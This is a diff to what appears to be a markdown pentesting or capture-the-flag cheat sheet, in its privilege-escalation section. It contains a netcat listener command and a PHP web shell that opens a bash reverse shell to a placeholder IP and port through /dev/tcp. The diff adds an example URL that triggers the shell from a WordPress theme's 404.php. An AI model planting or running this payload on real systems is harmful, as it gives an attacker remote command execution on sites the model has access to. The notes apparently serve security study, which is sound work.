@@ -48,11 +48,12 @@
 ## Privilege Escalation
 Listen: nc -lvnp [PORT]
 
-PHP Shell 
+PHP Shell (Trigger)
 ```<?php
 
 if (isset($_GET['trigger'])) {
     exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
-}```
+}
+Example: http://[IP]/wordpress/wp-content/themes/[THEME]/404.php?trigger=1)
+```
 
-Linux Privilege Escalation Awesome Script (linPEAS)
